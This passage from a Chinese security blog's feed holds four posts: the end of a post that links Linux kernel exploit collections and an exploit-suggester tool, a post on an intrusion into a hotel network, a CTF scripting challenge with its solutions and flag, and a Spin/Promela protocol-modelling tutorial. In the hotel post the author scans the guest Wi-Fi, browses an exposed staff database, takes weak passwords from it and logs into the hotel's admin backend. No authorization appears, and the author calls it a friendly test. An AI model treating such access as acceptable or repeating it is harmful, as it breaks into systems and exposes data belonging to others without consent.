src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AF%BB%E6%89%BE%20exp4.png" alt="此处输入图片的描述"></p><p>因为这个工具是按照严重等级从高到底排序的，所以还是比较方便的！</p><h2 id="0X02-Linux-下寻找可用的-exp"><a href="#0X02-Linux-下寻找可用的-exp" class="headerlink" title="0X02 Linux 下寻找可用的 exp"></a><strong>0X02 Linux 下寻找可用的 exp</strong></h2><p>相比于 Windows， Linux 的漏洞信息相对简单一些，但是还是要推荐这个项目</p><blockquote><p><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p></blockquote><p>还有下面这个工具</p><blockquote><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p></blockquote><p><strong>默认运行即可</strong></p><pre><code class="hljs">root@K0rz3n:~# ./linux-exploit-suggester-2.pl  #############################    Linux Exploit Suggester 2  #############################  Local Kernel: 4.15.0  Searching among 73 exploits...  Possible Exploits:</code></pre><blockquote><p>另外补充其他的两个项目：</p><p><a href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/">https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/</a><br><a href="https://github.com/xairy/kernel-exploits">https://github.com/xairy/kernel-exploits</a></p></blockquote><h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 总结</strong></h2><p>作为渗透测试技巧的第一篇，内容还是比较简单的，日后有空会慢慢更新该系列的更多的文章。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试 技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对某快捷酒店友情测试</title>
    <link href="/2019/01/24/%E5%AF%B9%E6%9F%90%E5%BF%AB%E6%8D%B7%E9%85%92%E5%BA%97%E5%8F%8B%E6%83%85%E6%B5%8B%E8%AF%95/"/>
    <url>/2019/01/24/%E5%AF%B9%E6%9F%90%E5%BF%AB%E6%8D%B7%E9%85%92%E5%BA%97%E5%8F%8B%E6%83%85%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>作为一个计算机专业的学生，出门必要带上电脑，到酒店干啥呢，肯定是一波扫描，这次就简单的记录一下。</p><h2 id="0X01-主机发现"><a href="#0X01-主机发现" class="headerlink" title="0X01 主机发现"></a><strong>0X01 主机发现</strong></h2><p>坐定，打开电脑，连上酒店 wifi ，先看一下自己的 IP </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%951.png" alt="此处输入图片的描述"></p><p>网关是 48 ，那么应该这个网段就是 192.168.48.0 了，因为0地址表示整个网络，我们一般不用作 IP 地址而用作网络地址，我们同样可以算一下</p><span id="more"></span><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%952.png" alt="此处输入图片的描述"></p><p>确实和我预期的一样，当然这个子网应该还有很多，这只是其中的一个</p><p>然后打开虚拟机，设置成桥接模式，掏出 masscan 开始对这个网段进行扫描，我已开始扫描的是 80 端口，但是发现结果并不尽人意，不知道是这个扫描器的问题还是怎么，似乎所有的主机都开放了 80 似的，于是我就又开始扫 8080 端口</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%953.png" alt="此处输入图片的描述"></p><p>有点爽，只有这么两台主机，目标一下子缩小了这么多，事不宜迟，访问一下看看</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%954.png" alt="此处输入图片的描述"></p><p>惊了，我见过太多的网站，还没见过这样的……什么安卓调试数据库，看了一下还是个 github 项目，百度了一下发现是一个便携的数据库管理工具如下图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%955.png" alt="此处输入图片的描述"></p><p>当然我这时候还在怀疑是不是某个旅客是程序员，然后正在测试自己的项目….于是乎我大概翻了一下看看有没有什么关键信息，说实话，这里面有用的东西没多少，并不是一个旅客的数据可，好多都是空的，只有一部分信息，不过看到下面这个图我就知道这一定是旅店的东西了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%956.png" alt="此处输入图片的描述"></p><p>我这运气也太好了吧，这还没进后台先进了数据库？？？神操作，这安全性。。。。</p><h2 id="0X02-信息收集"><a href="#0X02-信息收集" class="headerlink" title="0X02 信息收集"></a><strong>0X02 信息收集</strong></h2><p>简单的翻阅一下空荡荡的数据库里面仅有的信息，首先看到的是一个网址</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%957.png" alt="此处输入图片的描述"></p><p>访问了一下发现是一个后台</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%958.png" alt="此处输入图片的描述"></p><p>然后目标很明确，找一个用户名和密码，经过一番翻阅我注意到了一个关键人物</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%959.png" alt="此处输入图片的描述"></p><p>但是看了一下上面那个类似 json 的字段，我并没有发现这个用户的密码，于是乎继续寻找，功夫不负有心人，我找到了这样一个表</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%9510.png" alt="此处输入图片的描述"></p><p>hh，我只能说这些人的密码真的还是让我大开眼界，好多结合 123456 的，看来这 123456 永远不可能脱离弱密码第一名了，于是顺理成章我通过这个管理员的账号密码进入了酒店的后台</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%9511.png" alt="此处输入图片的描述"></p><p>看了一下，感觉没什么功能….就是一些分房，客房用品统计，服务员列表，打扫房间时间啥的，并没有能够利用的功能。</p><p>又看了一下之前检测到的另一台主机，发现是一个网络管理程序</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%9512.png" alt="此处输入图片的描述"></p><p>找了一下网上的默认密码并没有登录成功，又试了之前看到的一些密码还是不行，看来需要找别的途径了，又要进行一波信息收集了，或许这就是信息收集不完全就开搞的后果。。我又重新测试了一下80 端口，发现这次正常了，如下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%85%92%E5%BA%97%E6%B5%8B%E8%AF%9513.png" alt="此处输入图片的描述"></p><p>看到特殊的 ip 就看一下，发现了不少了网络管理软件的登陆页面，还有一些安全产品比如 UMC 啊 华为防火墙之类的，我又看了一下 445 139 端口似乎没有开启的主机。</p><p>临时想不到什么快捷的方法，时间也不早了，明天一大早还有事，暂且放你一马~~</p><h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 总结</strong></h2><p>一次不完整的渗透测试，没有找到真正的能够利用的点，不知道是因为时间问题，还是因为太菜了…反正想知道密码登录后台还是要靠信息收集吧，肯定是我哪里的信息还没有找到，还要多加磨炼，这篇就当日记了….大牛勿喷。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试 局域网扫描</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一道很锻炼脚本能力的小题(包括正则，文件处理，字符串处理等)</title>
    <link href="/2018/12/18/%E4%B8%80%E9%81%93%E5%BE%88%E9%94%BB%E7%82%BC%E8%84%9A%E6%9C%AC%E8%83%BD%E5%8A%9B%E7%9A%84%E5%B0%8F%E9%A2%98(%E5%8C%85%E6%8B%AC%E6%AD%A3%E5%88%99%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%EF%BC%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E7%AD%89)/"/>
    <url>/2018/12/18/%E4%B8%80%E9%81%93%E5%BE%88%E9%94%BB%E7%82%BC%E8%84%9A%E6%9C%AC%E8%83%BD%E5%8A%9B%E7%9A%84%E5%B0%8F%E9%A2%98(%E5%8C%85%E6%8B%AC%E6%AD%A3%E5%88%99%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%EF%BC%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E7%AD%89)/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>事情的起因是这学期开始的时候 XDSEC 招新，本来是交给大一的学弟学妹们出题运维的，但是我还是突发奇想的出了一个比较有趣的脚本题，难度并不是很大，但是很多东西都考到了，感觉很锻炼能力，意图也是让新生们学习一下脚本语言。当时题目一出来解的方法也非常多有用 C++ 的，有用 python 的，还有一个外校来交流的师傅用的是 shell 脚本。。。当然我是最奇葩的，我用的是 bat 脚本，因为当时正巧在看一些关于 bat 的东西，还写了<a href="http://www.k0rz3n.com/2018/07/25/%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99%E6%95%B4%E7%90%86/">这篇文章</a>，现在学期快结束了，我又想起来了这个东西，因为之前和那位外校师傅交流立了 flag 说要自己也写一个 shell 脚本的版本，于是现在来填坑啦!</p><h2 id="0X01-题目介绍"><a href="#0X01-题目介绍" class="headerlink" title="0X01 题目介绍"></a><strong>0X01 题目介绍</strong></h2><h3 id="题目名称：想去BAT-先过我这关！"><a href="#题目名称：想去BAT-先过我这关！" class="headerlink" title="题目名称：想去BAT?先过我这关！"></a><strong>题目名称：想去BAT?先过我这关！</strong></h3><p>本题你可以看到一共有50个文件夹，每个文件夹内有一个与文件夹同名的txt文档，每个文档里面有若干由随机数字和短横线组成的字符串。</p><p><strong>如图所示：</strong></p><span id="more"></span><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%B0%8F%E9%A2%981.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%B0%8F%E9%A2%982.png" alt="此处输入图片的描述"></p><h3 id="flag如何获取？"><a href="#flag如何获取？" class="headerlink" title="flag如何获取？"></a><strong>flag如何获取？</strong></h3><p>从每个文件夹下的每个文件中筛选出前两个数字都是4位的字符串，接着获取所有筛选出的字符串的第20位组成一个字符串，flag就是这个字符串的32位大写MD5的值</p><h2 id="0X02-怎么解"><a href="#0X02-怎么解" class="headerlink" title="0X02 怎么解"></a><strong>0X02 怎么解</strong></h2><h3 id="1-先说-shell-版本吧"><a href="#1-先说-shell-版本吧" class="headerlink" title="1.先说 shell  版本吧"></a><strong>1.先说 shell  版本吧</strong></h3><h4 id="思考方式是这样的："><a href="#思考方式是这样的：" class="headerlink" title="思考方式是这样的："></a><strong>思考方式是这样的：</strong></h4><p>(1)按顺序获取文件，使用 shell 的循环实现，设置变量<br>(2)匹配两个四位数的行使用 shell 中筛选函数 grep<br>(3)找出每行中的第20位字符使用 sed&#x2F;awk&#x2F;cut ，最后我选了 cut<br>(4)将筛选出的字符 合成一个字符串使用替换\n 为空的方式，使用 sed 和 tr </p><h4 id="给出脚本："><a href="#给出脚本：" class="headerlink" title="给出脚本："></a><strong>给出脚本：</strong></h4><pre><code class="hljs">#!/bin/bashi=1for dir in ./BAT/*do    #echo &quot;----------------------------------file$&#123;i&#125;-------------------------------------&quot;    #cat ./BAT/$&#123;i&#125;/$&#123;i&#125;.txt | while read line    #do    #echo $line    #echo -e &quot;\n&quot;    #donevar=`grep -E &#39;^[0-9]&#123;4&#125;----[0-9]&#123;4&#125;----.*$&#39; ./BAT/$&#123;i&#125;/$&#123;i&#125;.txt`echo -e $&#123;var&#125; &gt;&gt; tmpfilei=`expr $i + 1`donecat tmpfile | sed &#39;s/ /\n/g&#39;| cut -b 20 | tr &quot;\n&quot; &quot; &quot;|sed &#39;s/ //g&#39; &gt; newfilerm tmpfile</code></pre><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h4><p>这里有一个点，就是 sed 在用 s 进行替换的时候可以把空格替换成 \n 但是没法反过来，因为 sed 在进行替换的时候首先会去除所有的 \n ，操作完了再添加回去，因此我不得不用 tr ，但是 tr 似乎又不能直接替换成空，于是我只能先替换成空格。。。。无奈，当然，肯定有更简单的写法，我只是抛砖引玉。</p><h4 id="小结："><a href="#小结：" class="headerlink" title="小结："></a><strong>小结：</strong></h4><p>亲自写过以后感觉 shell 脚本真的很强大，又让我回顾了一下 sed(行的增删改查)、 awk(划分列的好帮手)、 cut (截取利器)、grep(过滤神器) ，而且又用到了 tr 这个有趣的命令，还是很有收获</p><h3 id="2-再说-bat-版本"><a href="#2-再说-bat-版本" class="headerlink" title="2.再说 bat 版本"></a><strong>2.再说 bat 版本</strong></h3><p>bat 脚本我个人非常不推荐，感觉很不好写，一句话：<strong>“可费了我老劲了”</strong></p><h4 id="附上脚本："><a href="#附上脚本：" class="headerlink" title="附上脚本："></a><strong>附上脚本：</strong></h4><pre><code class="hljs">@echo offsetlocal enabledelayedexpansionfor /L %%x in (1,1,50) Do (cd %%xfor /F &quot;tokens=* delims=----&quot; %%i in (%%x.txt) Do (echo %%i | findstr &quot;^[0-9][0-9][0-9][0-9]----[0-9][0-9][0-9][0-9]----.*&quot; &gt;&gt; ../test1.txt)cd ..)for /F &quot;tokens=* delims=----&quot; %%a in (test1.txt) Do (set var=%%aset var1=!var:~19,1!echo !var1! &gt;&gt; test2.txt)for /F &quot;tokens=*&quot; %%b in (test2.txt) Do set /p &quot;var2=%%b&quot;&lt;nul&gt;&gt;test3.txtfor /F &quot;tokens=* delims= &quot; %%c in (test3.txt) Do (set var3=%%cset solvtion=!var3: =!echo !solvtion! &gt;&gt; solve1.txt) pause</code></pre><p>感兴趣的童鞋可以看一下我之前的 bat 的语法总结，然后对照着看看，仅供参考</p><h3 id="3-其他版本"><a href="#3-其他版本" class="headerlink" title="3.其他版本"></a><strong>3.其他版本</strong></h3><p>想的真美，自己写去</p><h2 id="0X03-题目生成脚本及-flag"><a href="#0X03-题目生成脚本及-flag" class="headerlink" title="0X03 题目生成脚本及 flag"></a><strong>0X03 题目生成脚本及 flag</strong></h2><h3 id="1-生成脚本"><a href="#1-生成脚本" class="headerlink" title="1.生成脚本"></a><strong>1.生成脚本</strong></h3><pre><code class="hljs">@echo offsetlocal enabledelayedexpansionfor /L %%i in (1,1,50) DO (md %%icd %%ifor /L %%a in (1,1,100) DO (echo !random!----!random!----!random!!random!----!random!&gt;&gt;%%i.txt)cd ..)pause</code></pre><h3 id="2-flag"><a href="#2-flag" class="headerlink" title="2.flag"></a><strong>2.flag</strong></h3><pre><code class="hljs">084B5737BFC8C3901C4E3A8BFF5AD6BC</code></pre><h3 id="3-注意点"><a href="#3-注意点" class="headerlink" title="3.注意点"></a><strong>3.注意点</strong></h3><p>我这个生成脚本是在 windows 下的，如果直接拿到 linux 下用 shell 处理会出现问题，因为回车换行的不同，这就需要各位自己替换解决啦！</p><h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 总结</strong></h2><p>你亲自试一下就是知道 bat 脚本的效率非常的第，但是 shell 脚本就很高，可以说在代码简洁程度和运行效率上 shell 完胜，题目虽小，五脏俱全，有兴趣的同学可以自己尝试用各种能想到的方式实现，相信你会有新的收获。</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 下使用 Spin 配合 promela 语言进行协议的模拟分析</title>
    <link href="/2018/12/17/Linux%20%E4%B8%8B%E4%BD%BF%E7%94%A8%20Spin%20%E9%85%8D%E5%90%88%20promela%20%E8%AF%AD%E8%A8%80%E8%BF%9B%E8%A1%8C%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%88%86%E6%9E%90/"/>
    <url>/2018/12/17/Linux%20%E4%B8%8B%E4%BD%BF%E7%94%A8%20Spin%20%E9%85%8D%E5%90%88%20promela%20%E8%AF%AD%E8%A8%80%E8%BF%9B%E8%A1%8C%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>计算机网络及通信系统的核心技术是协议分析与设计。协议分析与设计是借助计算机，在相应软件平台上对以PROMELA语言为描述手段完成的设计规范，自动地完成相应协议仿真，模拟，验证测试，从而减少协议开发过程中存在的错误，提高协议开发的效率和质量。</p><p>对于给定的一个使用PROMELA描述的协议系统，SPIN可以对其执行任意的模拟，也可以生成一个C代码程序，然后对该系统的正确性进行有效检验，并报告系统中出现的死锁，无效的循环，未定义的接受和标记不完全等情况。</p><p><strong>补充：</strong></p><blockquote><p>SPIN 是最强大的模型检测工具之一，也是迄今为止唯一获得 ACM 软件系统奖的模型 检测工具 ，本文实验所用为 SPIN 的（ GUI）界面化工具 iSPAN,Promela 是 SPIN 的一种建 模语言</p></blockquote><span id="more"></span><h2 id="0X01-iSpin-的安装"><a href="#0X01-iSpin-的安装" class="headerlink" title="0X01 iSpin 的安装"></a><strong>0X01 iSpin 的安装</strong></h2><p>这个软件大多数是在Linux 下使用的，如果想在 windows 下使用的话需要安装 cygwin 或者 MINGW ,这里有我的好朋友莲师傅写过了—&gt;<a href="https://www.xlotusx.xyz/Win%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AESpin/">Windows 环境下 Spin 的安装配置</a>,但我觉得很麻烦，不如开一个虚拟机，于是我这里就介绍在 Ubuntu 16.04 下面的安装方法.</p><h3 id="1-下载安装包"><a href="#1-下载安装包" class="headerlink" title="1.下载安装包"></a><strong>1.下载安装包</strong></h3><p>首先找到 spin 的<a href="http://spinroot.com/spin/Src/index.html">官网</a>下载 Linux 下的安装包，如下图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/spin1.png" alt="此处输入图片的描述"></p><h3 id="2-解压"><a href="#2-解压" class="headerlink" title="2.解压"></a><strong>2.解压</strong></h3><p>放到 linux 下解压</p><pre><code class="hljs">tar -zxvf spin648.tar.gz</code></pre><p>得到 Spin 文件夹</p><pre><code class="hljs">cd ./Spin/Src6.4.8</code></pre><h3 id="3-开始编译"><a href="#3-开始编译" class="headerlink" title="3.开始编译"></a><strong>3.开始编译</strong></h3><p>然后开始编译，但是因为这里编译用到了 yacc 默认是不会安装的，于是这里还要</p><pre><code class="hljs">apt-get install bison</code></pre><p>然后执行</p><pre><code class="hljs">make</code></pre><p>然后当前目录下就成功生成了一个编译好的 spin ，我们执行看一下</p><p>.&#x2F;spin</p><h3 id="4-安装-ispin"><a href="#4-安装-ispin" class="headerlink" title="4.安装 ispin"></a>4.安装 ispin</h3><p>然后我们需要安装 ispin ，我们进入 Spin 下的 iSpin 目录，给 bash 脚本执行权限 </p><pre><code class="hljs">chmod a+x install.sh</code></pre><p>然后</p><pre><code class="hljs">sudo ./install.sh</code></pre><p>最后进入到 Spin 目录下的 Src6.4.8 目录，使用命令  </p><pre><code class="hljs">sudo cp spin /usr/bin/</code></pre><h3 id="5-运行"><a href="#5-运行" class="headerlink" title="5.运行"></a><strong>5.运行</strong></h3><p>使用 ispin 命令就能启动我们的 ispin 程序，如下图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/spin2.png" alt="此处输入图片的描述"></p><h2 id="0X02-模拟-AB-协议"><a href="#0X02-模拟-AB-协议" class="headerlink" title="0X02 模拟 AB 协议"></a><strong>0X02 模拟 AB 协议</strong></h2><p>我们使用 promela 语言可以描述一个协议系统，这里我以 AB 协议为例</p><h3 id="1-要求"><a href="#1-要求" class="headerlink" title="1.要求"></a><strong>1.要求</strong></h3><p>首先写出AB协议的 PROMELA描述，并验证 A获取的每一个报文至少有一次是正确的，而 B 接收的<br>每一个报文至多有一次是正确的。</p><p><strong>AB 协议的状态图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/AB%E5%8D%8F%E8%AE%AE%E7%8A%B6%E6%80%81%E5%9B%BE_.png" alt="此处输入图片的描述"></p><p>因为根据状态图， S3状态和 S1状态一致，所以将 S3状态与S1状态合并。 在该过程中， 一共有 3 种信号 a,b,Err，所以我们定义 mtype &#x3D; {a,b,Err}。然后定义两个信道，用于在发送方实体 A 和接收方实体 B<br>进行数据传输。</p><pre><code class="hljs">chan AtoB = [1] of &#123;mtype,byte&#125;; chan BtoA = [1] of &#123;mtype,byte&#125;; </code></pre><p><strong>主要过程为：</strong></p><p>发送方处于 S5状态，并发送报文 a(0)（模拟出错用 Err(0)），此时处于 S4等待应答。<br>当接收方处于 S4并接收到报文，如果是 a(0)或者是 a(1)则转向 S1状态，并发送报文 b(1)且转到 S2状态；如果是 Err(0)则转向 S5状态，并发送报文 b(0)且转到 S4状态。<br>而发送方如果收到的应答是 b(0)或者是 b(1)则转向 S1状态，并发送报文 a(1)且转到 S2状态。<br>如果是 Err(0)则回到 S5状态，并发送报文 a(0)且转到 S4状态。</p><p>我们假设接受方目前在 S2状态并接收到报文，如果是 a(0)则转向 S3（S1），如果是 a(1)则转向 S1状态，并发送报文 b(1)且转到 S2状态；如果是 Err(0)则转向 S5状态，并发送报文 b(0)<br>且转到 S4状态。而我们同样假设发送方处于 S2状态并接收到报文，如果是b(0)则转向 S3（S1），如果是 b(1)则转向 S1状态，并发送报文 a(1)且转到 S2状态；如果是 Err(0)则转向 S5状态，并发送报文 a(0)<br>且转到 S4状态。</p><p>所以我们根据分析，能够得到： A 获取的每一个报文至少有一次是正确的，而B接受的每一个报文至多有一次是正确的。</p><p><strong>代码如下：</strong></p><pre><code class="hljs">mtype = &#123;Err,a,b&#125;; chan SenderToReceiver = [1] of &#123;mtype,byte&#125;; chan ReceiverToSender = [1] of &#123;mtype,byte&#125;; proctype A_SENDER(chan InCh, OutCh) &#123; S5: if ::OutCh!a(0) ::OutCh!Err(0) fi; if ::InCh?Err(0)-&gt; goto S5 ::InCh?b(0)-&gt; goto S1 ::InCh?b(1)-&gt; goto S1 fi; S1: if ::OutCh!a(1) ::OutCh!Err(0) fi; if ::InCh?Err(0)-&gt; goto S5 ::InCh? b(1)-&gt; goto S1 ::InCh?b(0)-&gt; goto S1 fi; &#125; proctype B_RECEIVER(chan InCh, OutCh) &#123; if ::InCh?Err(0)-&gt; goto S5 ::InCh?a(0) -&gt; goto S1 ::InCh?a(1)-&gt; goto S1 fi; S5: if ::OutCh!b(0) ::OutCh!Err(0) fi; if ::InCh?Err(0)-&gt; goto S5 ::InCh?a(0) -&gt; goto S1 ::InCh?a(1)-&gt; goto S1 fi; S1: if ::OutCh!b(1) ::OutCh!Err(0) fi; if ::InCh?Err(0)-&gt; goto S5 ::InCh?a(1)-&gt; goto S1 ::InCh?a(0)-&gt; goto S1 fi; &#125; proctype B_SENDER(chan InCh, OutCh) &#123; S5: if ::OutCh!b(0) ::OutCh!Err(0) fi; if ::InCh?Err(0)-&gt; goto S5 ::InCh?a(0) -&gt; goto S1 ::InCh?a(1)-&gt; goto S1 fi; S1: if ::OutCh!b(1) ::OutCh!Err(0) fi; if ::InCh?Err(0)-&gt; goto S5 ::InCh?a(1)-&gt; goto S1 ::InCh?a(0)-&gt; goto S1 fi; &#125; proctype A_RECEIVER(chan InCh, OutCh) &#123; if ::InCh?Err(0)-&gt; goto S5 ::InCh?b(0)-&gt; goto S1 ::InCh?b(1)-&gt; goto S1 fi; S5: if ::OutCh!a(0) ::OutCh!Err(0) fi; if ::InCh?Err(0)-&gt; goto S5 ::InCh?b(0)-&gt; goto S1 ::InCh?b(1)-&gt; goto S1 fi; S1: if ::OutCh!a(1) ::OutCh!Err(0) fi; if ::InCh?Err(0)-&gt; goto S5 ::InCh? b(1)-&gt; goto S1 ::InCh?b(0)-&gt; goto S1 fi; &#125; init &#123; atomic &#123; run A_SENDER(ReceiverToSender,SenderToReceiver); run B_RECEIVER(SenderToReceiver, ReceiverToSender); &#125; /* atomic &#123; run B_SENDER(ReceiverToSender,SenderToReceiver); run A_RECEIVER(SenderToReceiver, ReceiverToSender); &#125;*/ &#125; </code></pre><p>我们将其保存为 AB.pml 然后使用 ispin 进行模拟</p><p>我们首先用这个工具打开 AB.pml 文件，如图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/AB%E6%A8%A1%E6%8B%9F1.png" alt="此处输入图片的描述"></p><p>点击顶部第二行中的 Syntax Check  按钮进行语法检测</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/AB%E6%A8%A1%E6%8B%9F2.png" alt="此处输入图片的描述"></p><p>可以看到我们的代码没有语法问题，这个时候我们就能开始模拟了</p><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/AB%E6%A8%A1%E6%8B%9F3.png" alt="此处输入图片的描述"></p><h2 id="0X03-模拟停止等待协议"><a href="#0X03-模拟停止等待协议" class="headerlink" title="0X03 模拟停止等待协议"></a><strong>0X03 模拟停止等待协议</strong></h2><h3 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1.基本原理"></a><strong>1.基本原理</strong></h3><p>全双工通信的双方既是发送方也是接收方。为了讨论方便，仅考虑A发送数据而B接收数据并发送确认。A叫发送方，B 叫接收方。“停止等待”就是每发送完一个分组就停止发送，等待对方的确认。在收到确认后再发送下一个分组。</p><p>(1)无差错情况</p><p>A发送分组M1，发送完后就暂停发送，等待B的确认。B 收到M1后就向A 发送确认。A 在收到对M1的确认后，就继续发送下一个分组M2。同样，在收到B 对M2的确认后，再继续发送下一个分组。</p><p>(2)出现差错</p><p>A 只要超过一段时间后仍没有收到确认，就认为刚发送的分组丢失，因而重传前面发送过的分组。实现这个功能应该保证：<br>a)A 在发送完一个分组后，必须暂时保留已发送的分组的副本。只有在收到相应的确认后才能清除暂时保留的分组副本。<br>b)分组和确认分组都 必须进行编号。<br>c)超时计时器设置的重传时间应当比数据在分组传输的平均往返时间更长一些。</p><p>(3)确认丢失和确认迟到</p><p>假设当B发送的对M2确认丢失后，A 在设定的超时重传时间内没有收到M2的确认，但并不知道是自己发送的分组出错、丢失，或者B发送的确认丢失。因此 A 在超时计时器到期后就要重传分组M2。B在收到M2后应采取的两个动作：<br>a)丢弃这个重复的分组M2。<br>b)向A 发送确认。<br>这种可靠传输协议称为自动重传请求ARQ（Automatic Repeat reQuest）,可以在不可靠的传输网络上实现可靠的通信。</p><h3 id="2-实例代码"><a href="#2-实例代码" class="headerlink" title="2.实例代码:"></a><strong>2.实例代码:</strong></h3><pre><code class="hljs">/*!表示发给通道头尾部,?表示从通道头部取数据*/#define MAXSEQ 2mtype=&#123;Msg,Ack,Nak,Err,Miss&#125;;/*类型*/chan SenderToReceiver=[1]of&#123;mtype,byte,byte&#125;;/*通道*/chan ReceiverToSender=[1]of&#123;mtype,byte,byte&#125;;proctype SENDER(chan InCh,OutCh)/*进程说明*/&#123;byte SendData;byte SendSeq;byte ReceivedSeq;SendData=MAXSEQ-1;do::SendData=(SendData+1)%MAXSEQ;again:         if::OutCh!Msg(SendData,SendSeq)/*随机选择发送*/::OutCh!Err(0,0)::OutCh!Miss(0,0)fi;if::timeout -&gt; goto again::InCh?Miss(0,0)-&gt; goto again::InCh?Err(0,0)-&gt; goto again::InCh?Nak(ReceivedSeq,0)-&gt;end1: goto again::InCh?Ack(ReceivedSeq,0)-&gt;//如果是ACKif::(ReceivedSeq==SendSeq)-&gt; goto progress //如果是 seq 正确::(ReceivedSeq!=SendSeq)-&gt;  // seq 错误end2: goto againfi;fi;progress:SendSeq=1-SendSeq;od;&#125;proctype RECEIVER(chan InCh,OutCh)&#123;byte ReceivedData;byte ReceivedSeq;byte ExpectedData;byte ExpectedSeq;do::InCh?Msg(ReceivedData,ReceivedSeq)-&gt;if::(ReceivedSeq==ExpectedSeq)-&gt;progress: ExpectedSeq=1-ExpectedSeq;if::OutCh!Miss(0,0)ExpectedSeq=1-ExpectedSeq;::OutCh!Ack(ReceivedSeq,0)::OutCh!Err(0,0)ExpectedSeq=1-ExpectedSeq;fi;::(ReceivedSeq!=ExpectedSeq)if::OutCh!Nak(ReceivedSeq,0)::OutCh!Err(0,0)::OutCh!Miss(0,0)fi;fi;::InCh?Err(0,0)if::OutCh!Nak(ReceivedSeq,0)::OutCh!Err(0,0)::OutCh!Miss(0,0)fi;::InCh?Miss(0,0)-&gt;skip;od;&#125;init/*初始进程*/&#123;atomic&#123;run SENDER(ReceiverToSender,SenderToReceiver);/*创建进程实例*/run RECEIVER(SenderToReceiver,ReceiverToSender);&#125;&#125;</code></pre><h3 id="3-运行效果"><a href="#3-运行效果" class="headerlink" title="3.运行效果"></a><strong>3.运行效果</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AD%89%E5%81%9C%E5%8D%8F%E8%AE%AE.png" alt="此处输入图片的描述"></p><h2 id="0X04-GO-BACK-N协议"><a href="#0X04-GO-BACK-N协议" class="headerlink" title="0X04 GO-BACK-N协议"></a><strong>0X04 GO-BACK-N协议</strong></h2><h3 